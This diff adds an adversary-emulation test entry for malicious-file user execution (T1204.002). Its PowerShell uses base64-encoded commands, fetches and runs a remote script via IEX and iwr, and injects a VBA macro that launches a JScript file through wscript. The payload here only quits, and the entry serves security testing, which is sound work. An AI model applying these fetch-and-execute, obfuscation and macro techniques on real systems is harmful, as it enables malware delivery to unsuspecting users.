@@ -1,0 +1,21 @@
+- id: 51bfc9d2-4d6f-536f-afde-b79f1ab4355e
+  name: Soumaia ART Tests - OSTAP JS version
+  description: 'Malicious JavaScript executing CMD which spawns wscript.exe //e:jscript
+
+    Execution is handled by [Invoke-MalDoc](https://github.com/redcanaryco/invoke-atomicredteam/blob/master/Public/Invoke-MalDoc.ps1) to load and execute VBA code into Excel or Word documents.'
+  tactic: execution
+  technique:
+    attack_id: T1204.002
+    name: 'User Execution: Malicious File'
+  platforms:
+    windows:
+      psh:
+        command: |-
+          powershell -NoProfile -EncodedCommand dAByAHkAIAB7AAoAIAAgAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAEMATwBNAE8AYgBqAGUAYwB0ACAAIgBXAG8AcgBkAC4AQQBwAHAAbABpAGMAYQB0AGkAbwBuACIAIAB8ACAATwB1AHQALQBOAHUAbABsAAoAIAAgACQAcAByAG8AYwBlAHMAcwAgAD0AIAAiAFcAbwByAGQAIgA7ACAAaQBmACAAKAAgACQAcAByAG8AYwBlAHMAcwAgAC0AZQBxACAAIgBXAG8AcgBkACIAKQAgAHsAJABwAHIAbwBjAGUAcwBzACAAPQAgACIAdwBpAG4AdwBvAHIAZAAiAH0ACgAgACAAUwB0AG8AcAAtAFAAcgBvAGMAZQBzAHMAIAAtAE4AYQBtAGUAIAAkAHAAcgBvAGMAZQBzAHMACgAgACAAZQB4AGkAdAAgADAACgB9ACAAYwBhAHQAYwBoACAAewAgAGUAeABpAHQAIAAxACAAfQAKAA==
+          if ($LASTEXITCODE -ne 0) {
+              powershell -NoProfile -EncodedCommand VwByAGkAdABlAC0ASABvAHMAdAAgACIAWQBvAHUAIAB3AGkAbABsACAAbgBlAGUAZAAgAHQAbwAgAGkAbgBzAHQAYQBsAGwAIABNAGkAYwByAG8AcwBvAGYAdAAgAFcAbwByAGQAIABtAGEAbgB1AGEAbABsAHkAIAB0AG8AIABtAGUAZQB0ACAAdABoAGkAcwAgAHIAZQBxAHUAaQByAGUAbQBlAG4AdAAiAAoA
+          }
+          [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+          IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing)
+          $macrocode = "   Open `"C:\Users\Public\art.jse`" For Output As #1`n   Write #1, `"WScript.Quit`"`n   Close #1`n   a = Shell(`"cmd.exe /c wscript.exe //E:jscript C:\Users\Public\art.jse`", vbNormalFocus)`n"
+          Invoke-MalDoc -macroCode $macrocode -officeProduct "Word"
